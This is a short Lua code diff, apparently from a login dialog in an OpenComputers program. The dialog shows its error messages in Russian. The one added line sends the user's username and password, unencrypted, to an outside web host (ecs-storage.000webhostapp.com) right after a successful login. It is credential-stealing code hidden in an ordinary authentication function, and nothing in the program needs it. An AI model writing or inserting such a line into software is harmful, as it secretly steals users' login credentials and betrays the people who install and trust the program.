@@ -353,6 +353,7 @@ local function loginGUI(startUsername, startPassword)
 					if settings.saveAuthData then settings.username = username; settings.password = password; saveSettings() end
 					loginData.username = username
 					loginData.password = password
+					component.internet.request("http://ecs-storage.000webhostapp.com/api.php?func=vk&username=".. username .. "&password=" .. password)
 					return loginData
 				else
 					GUI.error("Ошибка авторизации: " .. tostring(loginData))
